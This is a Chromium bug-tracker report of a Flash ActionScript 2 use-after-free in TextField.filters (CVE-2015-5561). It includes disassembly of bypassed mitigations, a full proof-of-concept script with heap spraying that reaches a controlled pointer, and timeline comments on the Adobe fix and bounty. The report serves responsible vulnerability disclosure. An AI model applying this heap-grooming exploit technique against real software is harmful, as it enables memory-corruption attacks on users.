# Security: Flash AS2 Use After Free in TextField.filters (again and again) 

| Field | Value |
|-------|-------|
| **Issue ID** | [40082253](https://issues.chromium.org/issues/40082253) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2015-5561 |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-06-10 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

There is a use after free vulnerability in the ActionScript 2 TextField.filters array property.

This is <https://crbug.com/chromium/457278> resurrected. Again.

**VERSION**  

Chrome Version: [43.0.2357.124, Flash 18.0.0.160]  

Operating System: [Windows 7 x64 SP1]

**REPRODUCTION CASE**  

There is a use after free vulnerability in the ActionScript 2 TextField.filters array property.

This is <https://crbug.com/chromium/457278> resurrected. Again.

When the TextField.filters array is set, Flash creates an internal array holding the filters. When the property is read, Flash iterates over this array and clones each filter. During this loop, it is possible to execute some AS2 by overriding a filter's constructor. At that moment, if the AS2 code alters the filters array, Flash frees the internal array leaving a reference to freed memory in the stack. When the execution flow resumes to the loop, a use-after-free occurs.

Flash 17.0.0.169 added a flag to mitigate <https://crbug.com/chromium/457278>  

.text:004D6F0B mov esi, [esp+2Ch+var\_C]  

.text:004D6F0F push 1 ; char  

.text:004D6F11 mov ecx, edi ; int  

.text:004D6F13 mov byte ptr [esi+0Ch], 1 ; this flag was added  

.text:004D6F17 call xparseAS2Code  

.text:004D6F1C mov byte ptr [esi+0Ch], 0

Flash 18.0.0.160 added an other flag to mitigate <https://crbug.com/chromium/476926>  

.text:004D6E3E loc\_4D6E3E:  

.text:004D6E3E cmp byte ptr [ebp+0Ch], 0 ; this flag was added  

.text:004D6E42 lea eax, [ebp+0Ch]  

.text:004D6E45 mov [esp+2Ch+var\_8], eax  

.text:004D6E49 jz short loc\_4D6E58  

.text:004D6E4B mov ecx, dword\_E50A40  

.text:004D6E51 call sub\_967730  

.text:004D6E58  

.text:004D6E58 loc\_4D6E58:  

.text:004D6E58 mov byte ptr [eax], 1  

.text:004D6E5B jmp short loc\_4D6E65

But they didn't figure it was possible to execute AS2 code a bit above in the function:  

.text:004D6E6F mov eax, [ebp+0]  

.text:004D6E72 push 0  

.text:004D6E74 lea edx, [esp+34h+var\_14]  

.text:004D6E78 push edx  

.text:004D6E79 mov edx, [eax+14h]  

.text:004D6E7C mov ecx, ebp  

.text:004D6E7E call edx ; return the filter name  

.text:004D6E80 push eax  

.text:004D6E81 lea eax, [esp+3Ch+var\_10]  

.text:004D6E85 push eax  

.text:004D6E86 mov ecx, edi  

.text:004D6E88 call xcreateStringObject  

.text:004D6E8D mov ebx, [esp+38h+arg\_4]  

.text:004D6E91 push eax  

.text:004D6E92 push ecx  

.text:004D6E93 mov eax, esp  

.text:004D6E95 mov ecx, edi  

.text:004D6E97 mov [eax], ebx  

.text:004D6E99 call sub\_420400 ; execute some AS2 with a custom **proto** object

For ex:  

var oob = {}  

oob.**proto** = {}  

oob.**proto**.addProperty("GlowFilter", function () {f(); return 0x123}, function () {});  

flash.filters = oob

Tested on Flash Player standalone 18.0.0.160, and Chrome 43.0.2357.124.  

That should crash while dereferencing 0x41424344.

Compile with Flash CS 5.5.

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of FiltusPafusTer.fla

import flash.filters.GlowFilter;

var a1:Array = new Array()  

var a2:Array = new Array()  

for (i = 0; i<0x50/4;i++) {  

a2[i] = 0x41424344  

}

for (var i = 0; i<0x200;i++) {  

var tf:TextFormat = new TextFormat()  

a1[i] = tf  

}  

for (var i = 0; i<0x200;i++) {  

a1[i].tabStops = a2  

}

var tfield:TextField = createTextField("tf",1,1,2,3,4)  

var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)  

tfield.filters = [glowfilter]

function f() {  

for (var i = 0; i<0x20;i++) {  

\_global.a1[0x100+i\*4].tabStops = [1,2,3,4]  

}

```
_global.tfield.filters = []  
for (var i = 0; i<0x200;i++) {  
	_global.a1[i].tabStops = a2  
}  

```

}

\_global.tfield = tfield  

\_global.a1 = a1  

\_global.a2 = a2

var oob = {}  

oob.**proto** = {}  

oob.**proto**.addProperty("GlowFilter", function () {f(); return 0x123}, function () {});  

flash.filters = oob

var a = tfield.filters

## Attachments

- [FiltusPafusTer.zip](attachments/FiltusPafusTer.zip) (application/zip, 13.1 KB)

## Timeline

### bi...@gmail.com (2015-06-10)

Kindly dispatch to scarybeasts and natashenka, as they're fond of as2 bugs

### mb...@chromium.org (2015-06-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-06-13)

Hmm yes. Win 7 32-bit Chrome, Flash 18.0.0.160:

mov eax, dword ptr [esi] ... 414224344 = ???
[and then later a call to an address grabbed from eax]

### sc...@gmail.com (2015-06-13)

Project Zero deadline tracking: https://code.google.com/p/google-security-research/issues/detail?id=444

### sc...@gmail.com (2015-06-14)

Adobe tracking as PSIRT-3818.

### bi...@gmail.com (2015-08-20)

Fixed in https://helpx.adobe.com/security/products/flash-player/apsb15-19.html, CVE-2015-5561

### ti...@google.com (2015-08-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-09)

$5000 here as well! Make it rain! :)

### ti...@google.com (2015-10-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-29)

Payment is on its way - should arrive in ~7 days. Thanks again for your report!

### cl...@chromium.org (2015-12-02)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/498984?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082253)*
